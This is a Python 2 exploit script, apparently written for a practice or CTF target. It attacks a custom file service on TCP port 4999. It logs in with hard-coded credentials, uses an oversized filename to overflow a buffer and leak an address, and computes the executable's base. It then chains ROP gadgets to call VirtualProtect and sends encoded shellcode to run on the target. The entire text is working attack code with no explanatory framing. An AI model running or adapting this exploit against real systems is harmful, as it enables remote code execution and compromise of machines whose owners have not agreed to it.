#!/usr/bin/env python
import socket
import struct
import time

#exploit example:

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.connect(('127.0.0.1', 4999))
sock.connect(('10.211.55.52', 4999))

sock.sendall("\x10\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00") #ex_login packet

sock.sendall("\x11\x00\x00\x00user:URAQ") # user:pass login packet

data = sock.recv(2048) # recv the login msg
print data

setFileNamePt = "\x20\x00\x00\x00"
setFileNamePt += "\x10\x00\x00\x00"
setFileNamePt += "A" * 0x10
sock.sendall(setFileNamePt + '\n')
time.sleep(1)


writeFilePt = "\x31\x00\x00\x00"
writeFilePt += "\x20\x00\00\x00"
writeFilePt += "B" * 0x20
sock.sendall(writeFilePt + '\n')
time.sleep(1)

readFilePt = "\x30\x00\x00\x00"
readFilePt += "\x20\x00\00\x00"
readFilePt += "B" * 0x20
sock.sendall(readFilePt + '\n')
time.sleep(1)


setFileNameTrigger = "\x20\x00\x00\x00"
setFileNameTrigger += "\x08\x01\x00\x00"
setFileNameTrigger += "A" * 0x108
sock.sendall(setFileNameTrigger + '\n')
time.sleep(1)

queryFileNameLeak = "\x21\x00\x00\x00"
queryFileNameLeak += "\x0C\x01\x00\x00"
queryFileNameLeak += "A" * 0x10C
sock.sendall(queryFileNameLeak)
time.sleep(1)

data = sock.recv(2048)
rindex = data.rfind("A");
addrMsg = data[(rindex+1):len(data)]
leakAddr = struct.unpack("I",addrMsg)[0]

print data
print addrMsg
print '[+]' + hex(leakAddr)

Shellcode="\x81\xec\x00\x20\x00\x00\xb8\xf7\x20\xdd\x4a\xdb\xcf\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x33\x83\xc5\x04\x31\x45\x0e\x03\xb2\x2e\x3f\xbf\xc0\xc7\x36\x40\x38\x18\x29\xc8\xdd\x29\x7b\xae\x96\x18\x4b\xa4\xfa\x90\x20\xe8\xee\x23\x44\x25\x01\x83\xe3\x13\x2c\x14\xc2\x9b\xe2\xd6\x44\x60\xf8\x0a\xa7\x59\x33\x5f\xa6\x9e\x29\x90\xfa\x77\x26\x03\xeb\xfc\x7a\x98\x0a\xd3\xf1\xa0\x74\x56\xc5\x55\xcf\x59\x15\xc5\x44\x11\x8d\x6d\x02\x82\xac\xa2\x50\xfe\xe7\xcf\xa3\x74\xf6\x19\xfa\x75\xc9\x65\x51\x48\xe6\x6b\xab\x8c\xc0\x93\xde\xe6\x33\x29\xd9\x3c\x4e\xf5\x6c\xa1\xe8\x7e\xd6\x01\x09\x52\x81\xc2\x05\x1f\xc5\x8d\x09\x9e\x0a\xa6\x35\x2b\xad\x69\xbc\x6f\x8a\xad\xe5\x34\xb3\xf4\x43\x9a\xcc\xe7\x2b\x43\x69\x63\xd9\x90\x0b\x2e\xb7\x67\x99\x54\xfe\x68\xa1\x56\x50\x01\x90\xdd\x3f\x56\x2d\x34\x04\xa8\x67\x15\x2c\x21\x2e\xcf\x6d\x2c\xd1\x25\xb1\x49\x52\xcc\x49\xae\x4a\xa5\x4c\xea\xcc\x55\x3c\x63\xb9\x59\x93\x84\xe8\x39\x72\x17\x70\x90\x11\x9f\x13\xec"

exeBaseAddr = leakAddr & 0xFFFF0000

print exeBaseAddr

rop  = struct.pack("L",exeBaseAddr + 0x1018) # pop eax # ret
rop += struct.pack("L",exeBaseAddr + 0xda3c) # point to VirtualProtect
rop += struct.pack("L",exeBaseAddr + 0x1024) # mov eax,[eax] # ret
rop += struct.pack("L",exeBaseAddr + 0x102f) # xchg eax,esi # ret
rop += struct.pack("L",exeBaseAddr + 0x1022) # pop ebp # ret
rop += struct.pack("L",exeBaseAddr + 0x103a) # push esp# ret
rop += struct.pack("L",exeBaseAddr + 0x101a) # pop ebx # ret
rop += struct.pack("L",0x00400)
rop += struct.pack("L",exeBaseAddr + 0x101c) # pop ecx # ret
rop += struct.pack("L",exeBaseAddr + 0xdb78) # writable address
rop += struct.pack("L",exeBaseAddr + 0x1020) # pop edi # ret
rop += struct.pack("L",exeBaseAddr + 0x1021) # nop
rop += struct.pack("L",exeBaseAddr + 0x101e) # pop edx # ret
rop += struct.pack("L",0x0040) # newProtect
rop += struct.pack("L",exeBaseAddr + 0x1018) # pop eax # ret
rop += struct.pack("I",0x90909090)
rop += struct.pack("L",exeBaseAddr + 0x103e) # pushad # ret


data = rop + Shellcode
#write_body = struct.pack('L%ds' % len(data), len(data), data)

write_body = struct.pack('L%ds' % len(data), len(data), data)
write_body = write_body[4:]

setfileNameOverFlow = "\x20\x00\x00\x00"
setfileNameOverFlow += "\x0C\x01\x00\x00"
setfileNameOverFlow += "A" * 0x108
setfileNameOverFlow += struct.pack("I",exeBaseAddr + 0x102c)

print setfileNameOverFlow

sock.sendall(setfileNameOverFlow)
time.sleep(1)

raw_input('breakpoint')
writeFilePtTrigger = "\x31\x00\x00\x00"
writeFilePtTrigger += "\x00\x02\00\x00"
writeFilePtTrigger += write_body
writeFilePtTrigger += "B" * 0x200
sock.sendall(writeFilePtTrigger)
time.sleep(1)

sock.close()
